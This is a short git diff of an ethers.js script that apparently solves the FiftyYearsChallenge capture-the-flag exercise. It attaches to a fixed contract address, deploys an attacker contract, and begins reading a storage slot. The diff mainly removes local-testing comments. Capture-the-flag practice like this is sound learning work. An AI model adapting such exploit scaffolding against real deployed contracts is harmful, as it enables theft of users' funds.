@@ -4,9 +4,8 @@ const { utils, BigNumber, provider, constants } = ethers;
 const address = '0x5477edca380644056F7a77BDA296C086957f8FA1';
 
 async function main() {
-  // const [owner] = await ethers.getSigners();
-
   console.log('getting factories');
+
   const [targetFactory, attackerFactory] = await Promise.all([
     ethers.getContractFactory('FiftyYearsChallenge'),
     ethers.getContractFactory('FiftyYearsChallengeAttacker'),
@@ -14,18 +13,12 @@ async function main() {
 
   console.log('compiling contracts');
   const [target, attacker] = await Promise.all([
-    /*
-    targetFactory.deploy(owner.address, {
-      value: utils.parseEther('1'),
-    }),
-    */
-    // COMMENT NEXT LINE AND UNCOMMENT THE TWO COMMENTED BLOCKS FOR LOCAL TESTING
     targetFactory.attach(address),
     attackerFactory.deploy(),
   ]);
 
-  console.log('target deployed to:', target.address);
-  console.log('attacker deployed to:', attacker.address);
+  console.log('Target deployed to:', target.address);
+  console.log('Attacker deployed to:', attacker.address);
 
   console.log('getting timestamp');
   const arraySlotPosition = utils.hexlify(utils.hexZeroPad(BigNumber.from(0).toHexString(), 32));
